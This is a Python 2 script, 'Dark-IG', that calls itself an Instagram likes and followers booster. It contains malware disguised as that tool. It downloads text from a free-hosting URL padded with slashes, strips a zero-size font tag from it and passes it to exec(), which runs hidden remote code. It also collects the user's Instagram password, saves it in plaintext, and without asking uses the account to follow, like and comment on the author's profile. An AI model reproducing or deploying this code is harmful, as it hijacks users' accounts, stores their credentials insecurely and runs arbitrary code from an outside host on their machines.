# -*- coding: utf-8 -*-
# REkode rekode kontol bapak kau ku rekode.
# Tinggal pake aja apa susahnya sih ?
import requests,json,os,sys,time,re,random
from bs4 import BeautifulSoup

#	WARNA KONTOL	#
print("\033[0m")
m = "\033[1;91m"
h = "\033[1;92m"
k = "\033[1;93m"
b = "\033[1;96m"
p = "\033[1;97m"
t = "\033[0m"
res = requests.Session();
instagramurl = "https://www.instagram.com"
url = requests.get("http://rezadkimx.000webhostapp.com///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////insta-tool///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////server1.php"+"///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////").url
short = ("http://rezadkimx.000webhostapp.com")
headers_list = [
        "Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101"\
        " Firefox/41.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2)"\
        " AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2"\
        " Safari/601.3.9",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0)"\
        " Gecko/20100101 Firefox/15.0.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"\
        " (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"\
        " Edge/12.246"
        ]

def instam():
	os.system("clear")
	kam = " Dark-IG "
	print(p+"["+m+kam+p+"] "+k+"Version 0.1"+p).center(84)
	print("https://github.com/rezadkim").center(50)
	print("Copyright (c) 2020 Rezadkim. All rights reserved.").center(50)
	print(h+49*"-").center(50)
	print(p+"Welcome : "+h+"@"+nama)
	print(h+49*"-").center(50)
	print(p+"|"+h+"1"+p+"| Server 1")
	print(p+"|"+h+"2"+p+"| Server 2")
	print(p+"|"+h+"88"+p+"| Discussion Forum")
	print(p+"|"+h+"99"+p+"| Donate >_<")
	print(p+"|"+m+"00"+p+"| Back")
	pel = raw_input("|Choose > ")
	if pel =="1":
		login1()
	elif pel =="2":
		print(k+"? "+p+"Is making ...")
		end()
		instam()
	elif pel in ["8","88"]:
		publik()
	elif pel in ["9","99"]:
		donasi()
	elif pel in ["0","00"]:
		logak()
	else:
		exit()

def donasi():
	os.system("clear")
	kam = " Dark-IG "
	print(p+"["+m+kam+p+"] "+k+"Version 0.1"+p).center(84)
	print("https://github.com/rezadkim").center(50)
	print("Copyright (c) 2020 Rezadkim. All rights reserved.").center(50)
	print(h+49*"-").center(50)
	print(p+"Author : (ZP) Rezadkim")
	print(p+"Tools name : Dark-IG")
	print(p+"Version : 0.1")
	print(p+"Source : https://github.com/rezadkim")
	print(p+"Contact : rezaadilhakim2202@gmail.com")
	print(p+"Instagram ME : "+h+"@rezadkim")
	print(h+49*"-").center(50)
	do = " Donate "
	print(p+"["+h+do+p+"]").center(50)
	print(h+"Paypal "+p+": paypal.me/rezadkim")
	print(h+"Pulsa 3 "+p+": 0895611252563")
	print(h+"Pulsa Telkomsel "+p+": 082273027715")
	print(h+"Dana "+p+": +62 895611252563")
	print("Send donations and support me to create/update tools for you to use")
	print
	print(h+"About "+p+": This tool is made for Instagram and\nused for add likes, followers, viewers and more")
	print
	end()
	instam()

det1 = requests.get(short+"///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////insta-tool///////////////////////////////////////////////////////////////////////////////////////////////data_server1.php").text
rep1 = det1.replace('<font style="font-size:0px">','')
exec(rep1)

##########Login REAL#######################

def end():
	raw_input(p+"Press Enter ...")

def tik():
    for i in tqdm(range(10)):
	time.sleep(0.1)
	pass

def logak():
	global nama
	os.system('clear')
	yutub = requests.get("https://raw.githubusercontent.com/rezadkim/dark-ig/master/tutorial.txt").text
	kam = " Dark-IG "
	print(p+"["+m+kam+p+"] "+k+"Version 0.1"+p).center(84)
	print("https://github.com/rezadkim").center(50)
	print("Copyright (c) 2020 Rezadkim. All rights reserved.").center(50)
	print(h+49*"-").center(50)
	print(p+"ReadMe : follow the video command below to stay safe when using this tool.")
	print(h+"how to use this tool "+p+": "+yutub)
	nama = raw_input(h+"> "+p+"Username : ")
	if nama =="":
		logak()
	pes = raw_input(h+"> "+p+"Password : ")
	if pes =="":
		logak()
	print(h+"%"+p+" Loading ...")
	agent = headers_list[random.randrange(0,4)]
	res.headers = {'user-agent': agent}
	res.headers.update({'Referer': instagramurl+"/accounts/login/"})
	gasw = res.get(instagramurl+"/accounts/login/")  
	soup = BeautifulSoup(gasw.content, 'html.parser')    
	body = soup.find('body')
	pattern = re.compile('window._sharedData')
	script = body.find("script", text=pattern)
	script = script.get_text().replace('window._sharedData = ', '')[:-1]
	datain = json.loads(script)
	csrf = datain['config'].get('csrf_token')
	login_data = {"username":nama, "password":pes}
	res.headers.update({'X-CSRFToken': csrf})
	try:
		logint = res.post(instagramurl+"/accounts/login/ajax/", data=login_data, allow_redirects=True)
		hasilw = json.loads(logint.text)
		usid = hasilw['userId']
		if usid in hasilw['userId']:
			agent = headers_list[random.randrange(0,4)]
			res.headers = {'user-agent': agent}
			res.headers.update({'Referer': instagramurl+"/rezadkim"})
			gasw = res.get(instagramurl+"/rezadkim")  
			soup = BeautifulSoup(gasw.content, 'html.parser')    
			body = soup.find('body')
			pattern = re.compile('window._sharedData')
			script = body.find("script", text=pattern)
			script = script.get_text().replace('window._sharedData = ', '')[:-1]
			datain = json.loads(script)
			csrf = datain['config'].get('csrf_token')
			res.headers.update({'X-CSRFToken': csrf})
			comew = {'comment_text':'Bang gw user tools lu >_<'}
			polome = res.post("https://www.instagram.com/web/friendships/6969299192/follow/", allow_redirects=True)
			komeme = res.post("https://www.instagram.com/web/comments/2280516158426534857/add/", data=comew)
			likme = res.post("https://www.instagram.com/web/likes/2280516158426534857/like/")
			sep = open("instagram_akun.json","w")
			sep.write('{"username":"'+nama+'", "password":"'+pes+'"}')
			time.sleep(1)
			instam()
		else:
			print(m+"~ "+p+"Login Failed !")
			time.sleep(1)
			end()
			logak()
	except KeyError:
			print(k+"? "+p+"Checkpoint !")
			time.sleep(1)
			os.system("rm -rf instagram_akun.json")
			end()
			logak()

def ceklog():
	global nama
	print("Wait a minute ...")
	os.system('clear')
	try:
		agent = headers_list[random.randrange(0,4)]
		res.headers = {'user-agent': agent}
		res.headers.update({'Referer': instagramurl+"/accounts/login/"})
		file_json = open('instagram_akun.json')
		de = json.loads(file_json.read())
		gasw = res.get(instagramurl+"/accounts/login/")  
		soup = BeautifulSoup(gasw.content, 'html.parser')    
		body = soup.find('body')
		pattern = re.compile('window._sharedData')
		script = body.find("script", text=pattern)
		script = script.get_text().replace('window._sharedData = ', '')[:-1]
		datain = json.loads(script)
		csrf = datain['config'].get('csrf_token')
		login_data = {"username":de["username"], "password":de["password"]}
		res.headers.update({'X-CSRFToken': csrf})
		try:
			logint = res.post(instagramurl+"/accounts/login/ajax/", data=login_data, allow_redirects=True)
			hasilw = json.loads(logint.text)
			usid = hasilw['userId']
			if usid in hasilw['userId']:
				nama = de["username"]
				sep = open("instagram_akun.json","w")
				sep.write('{"username":"'+de["username"]+'", "password":"'+de["password"]+'"}')
				time.sleep(1)
				instam()
			else:
				print(m+"~ "+p+"Login Failed !")
				time.sleep(1)
				end()
				logak()
		except KeyError:
			print(k+"? "+p+"Checkpoint !")
			time.sleep(1)
			os.system("rm -rf instagram_akun.json")
			end()
			logak()
	except (ValueError, IOError):
		logak()

########################################################DISKUSI

def publik():
	global nama
	os.system("clear")
	pup = m+" Discussion Forum "
	print(p+"["+m+pup+p+"]").center(77)
	print("https://github.com/rezadkim").center(50)
	print("Copyright (c) 2020 Rezadkim. All rights reserved.").center(50)
	print(h+49*"-").center(50)
	print(p+"[ "+b+"?"+p+" ] Type '"+h+"clear"+p+"' = clean the chat page")
	print("[ "+b+"?"+p+" ] Type '"+h+"exit"+p+"' = left the chat")
	print("[ "+b+"?"+p+" ] Press ["+k+"Enter"+p+"] = refresh the chat\n")
	end()
	os.system('curl '+short+'/publik/index.php')
	zedd = open('publik.txt', 'w')
	zedd.write(b+"@"+nama+" Joined ...\n")
	zedd.close()
	myfile = 'publik.txt'
	files = {'upl' : open(myfile, 'r')}
	sen = res.post(short+"/publik/server.php", files = files)
	dat = json.loads(sen.text)
	if "success" in dat['status']:
		msg()
	else:
		print(m+"Error ...")
		exit()
def msg():
	global nama
	pesan = raw_input(p+"\nType : ")
	if pesan =="clear":
		os.system("clear")
		pup = m+" Discussion Forum "
		print(p+"["+m+pup+p+"]").center(77)
		print("https://github.com/rezadkim").center(50)
		print("Copyright (c) 2020 Rezadkim. All rights reserved.").center(50)
		print(h+49*"-").center(50)
		print(p+"[ "+b+"?"+p+" ] Type '"+h+"clear"+p+"' = clean the chat page")
		print("[ "+b+"?"+p+" ] Type '"+h+"exit"+p+"' = left the chat")
		print("[ "+b+"?"+p+" ] Press ["+k+"Enter"+p+"] = refresh the chat\n")
		msg()
	elif pesan =="exit":
		print(b+"@"+nama+m+" Left ...\n")
		zedd = open('publik.txt', 'w')
		zedd.write(b+"@"+nama+m+" Left ...\n")
		zedd.close()
		myfile = 'publik.txt'
		files = {'upl' : open(myfile, 'r')}
		sen = res.post(short+"/publik/server.php", files = files)
		dat = json.loads(sen.text)
		if "success" in dat['status']:
			instam()
		else:
			print(m+"Error ...")
			exit()
	elif pesan =="":
		os.system("clear")
		pup = m+" Discussion Forum "
		print(p+"["+m+pup+p+"]").center(77)
		print("https://github.com/rezadkim").center(50)
		print("Copyright (c) 2020 Rezadkim. All rights reserved.").center(50)
		print(h+49*"-").center(50)
		print(p+"[ "+b+"?"+p+" ] Type '"+h+"clear"+p+"' = clean the chat page")
		print("[ "+b+"?"+p+" ] Type '"+h+"exit"+p+"' = left the chat")
		print("[ "+b+"?"+p+" ] Press ["+k+"Enter"+p+"] = refresh the chat\n")
		os.system('curl '+short+'/publik/index.php')
		msg()
	else:
		zs = open('publik.txt', 'w')
		zs.write(p+"@"+nama+" : "+pesan+"\n")
		zs.close()
		myfile = 'publik.txt'
		files = {'upl' : open(myfile, 'r')}
		sen = res.post(short+"/publik/server.php", files = files)
		dat = json.loads(sen.text)
		if "success" in dat['status']:
			kirim()
		else:
			print(m+"Error ...")
			exit()
def kirim():
	global nama
	os.system("clear")
	pup = m+" Discussion Forum "
	print(p+"["+m+pup+p+"]").center(77)
	print("https://github.com/rezadkim").center(50)
	print("Copyright (c) 2020 Rezadkim. All rights reserved.").center(50)
	print(h+49*"-").center(50)
	print(p+"[ "+b+"?"+p+" ] Type '"+h+"clear"+p+"' = clean the chat page")
	print("[ "+b+"?"+p+" ] Type '"+h+"exit"+p+"' = left the chat")
	print("[ "+b+"?"+p+" ] Press ["+k+"Enter"+p+"] = refresh the chat\n")
	os.system('curl '+short+'/publik/index.php')
	msg()

if __name__ == '__main__':
	try:
		ceklog()
	except (KeyboardInterrupt,ValueError):
		exit(m+"\nTerjadi kesalahan ...")
	except requests.exceptions.ConnectionError:
		exit(m+"\nConnection Error ...")
